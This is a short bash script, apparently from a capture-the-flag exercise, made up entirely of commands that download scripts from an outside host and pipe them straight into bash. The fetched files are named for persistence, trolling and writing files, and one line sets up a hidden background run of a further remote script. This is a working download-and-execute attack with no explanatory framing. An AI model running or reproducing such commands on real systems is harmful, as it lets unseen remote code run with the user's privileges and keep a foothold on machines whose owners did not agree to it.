#!/usr/bin/env bash

curl http://ctf.danieltomov.me/persistence.sh | bash
curl http://ctf.danieltomov.me/troll_script.sh | bash
echo nohup curl http://ctf.danieltomov.me/write_file.sh \| bash \>/dev/null 2\>\&1 \&
